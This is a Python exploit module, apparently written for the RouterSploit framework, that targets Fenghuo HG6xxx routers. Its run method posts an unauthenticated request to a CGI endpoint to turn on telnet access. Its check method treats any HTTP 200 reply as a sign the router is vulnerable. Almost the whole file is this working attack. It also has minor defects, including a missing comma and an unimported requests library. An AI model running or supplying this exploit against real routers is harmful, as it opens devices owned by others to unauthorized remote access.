from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit fenghuo open telnet
    """
    __info__ = {
        'name': 'Fenghuo Open telnet',
        'description': 'Module Open telnet'
        'authors': [
            'mosin',  # vulnerability discovery
            'Mosin Email<hucmoxing@163.com>',  # routersploit module
        ],
        'references': [
            '',
        ],
        'devices': [
            'Fenghuo HG6xxx',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        url = "{}:{}/cgi-bin/services_CM.cgi".format(self.target, self.port)
        url1 = "{}:{}/index_main_CM".format(self.target,self.port)
        headers = {'Referer': url1,
               'Content-Type': 'application/x-www-form-urlencoded',
               'X-Requested-With': 'XMLHttpRequest',
               'Accept': 'application/json, text/javascript, */*',
               'Accept-Language': 'zh-CN',
               'Accept-Encoding': 'gzip, deflate',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
               'Pragma': 'no-cache',
               'Host': self.target
               }
        post_data = {
            'action':'telnet',
            'telnetenable':'1'
            }

        req2 = requests.post(url, data=post_data, headers=headers, timeout=10, verify=False)
        if "success" in req2.text:
            print_success("[+] Open Telnet Access.")
        else:
            print_error("[-] Open Telnet Fail.")


    @mute
    def check(self):
        url = "{}:{}/cgi-bin/services_CM.cgi".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200:
            return True  # target is vulnerable

        return False  # target not vulnerable
